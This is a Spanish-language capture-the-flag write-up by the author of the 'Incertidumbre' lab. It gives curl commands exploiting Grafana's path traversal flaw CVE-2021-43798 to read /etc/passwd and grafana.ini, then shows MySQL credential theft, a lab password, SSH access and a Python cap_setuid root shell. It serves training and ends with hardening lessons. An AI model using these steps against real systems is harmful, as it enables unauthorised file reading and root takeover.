---

title: "TheHackersLabs - Incertidumbre [Avanzado]"
description: "Análisis completo de explotación desde LFI en Grafana hasta escalada de privilegios con capabilities."
publishDate: 2025-08-06
category: "ctf"
type: "created-ctf"
difficulty: "medium"
tags: ["thehackerslabs", "grafana", "lfi", "mysql", "linux", "capabilities", "python", "ssh"]
readingTime: "9 min"

----
Este CTF fue creado por mí, Oscar Sanchez (@Oskitaar90), especialmente para la comunidad de TheHackersLabs. Agradecimientos a CuriosidadesDeHackers y Condor por su apoyo continuo.

## Información del Challenge

* 📛 **Nombre**: Incertidumbre
* 📈 **Dificultad**: Avanzado
* 💻 **SO**: Linux
* 👨‍💻 **Creador**: @Oskitaar90
* **URL del reto**: [https://labs.thehackerslabs.com/machine/48](https://labs.thehackerslabs.com/machine/48)

## Análisis técnico

* Servicios expuestos: SSH (22), HTTP (80), Grafana (3000)
* Vulnerabilidad principal: LFI en Grafana (CVE-2021-43798)
* Otros vectores: MySQL con credenciales extraídas, Python con cap\_setuid habilitado

## Desarrollo de la solución

### 🔎 Enumeración inicial

```bash
sudo nmap -sSCV -p- -Pn -n --min-rate 5000 10.0.2.15
```

Resultado:

```
22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu Linux)
80/tcp   open  http    Apache/2.4.41 (403 Forbidden)
3000/tcp open  http    Grafana v8.2.0
```

### 📂 LFI en Grafana (CVE-2021-43798)

```bash
curl --path-as-is http://10.0.2.14:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
curl --path-as-is http://10.0.2.14:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini
```

Credenciales extraídas:

```
usuario = grafana
contraseña = <obtenida desde grafana.ini>
```

### 🔐 Acceso a MySQL

```bash
mysql -h 10.0.2.14 -u grafana -p
```

```sql
show databases;
use grafana_db;
select * from users;
```

Credenciales:

```
usuario: cloud
contraseña: b0KjQXwH801dm2vnOgP2anEc8JGidc
```

### 🧑‍💻 Acceso SSH como cloud

```bash
ssh cloud@10.0.2.14
```

```bash
whoami && pwd
```

### 🔍 Escalada de privilegios

Verificación sudo:

```bash
sudo -l
```

```bash
(ALL) NOPASSWD: /usr/local/bin/set_date.sh
```

El script no es legible. Buscando capabilities:

```bash
getcap /usr/bin/python3.8
```

Resultado:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+ep
```

### ⚡ Shell root con Python

```bash
python3
```

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

```bash
whoami
# root
```

## Flag

```
THL{pr1v1l3g3_3sc4l4t10n_w1th_c4p4b1l1t13s}
```

## Lecciones aprendidas

* LFI sin autenticación en Grafana puede comprometer todo un sistema
* No almacenar contraseñas en texto plano (grafana.ini)
* Configuraciones peligrosas de capabilities pueden ser críticas (cap\_setuid)
* Revisar scripts en sudoers, incluso sin visibilidad directa

## Referencias

* [CVE-2021-43798 - Grafana LFI](https://nvd.nist.gov/vuln/detail/CVE-2021-43798)
* [Linux Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
* [MariaDB Documentation](https://mariadb.com/kb/en/)
* [Grafana Configuration](https://grafana.com/docs/)
* [SSH Access Hardening](https://www.ssh.com/academy/ssh/security)
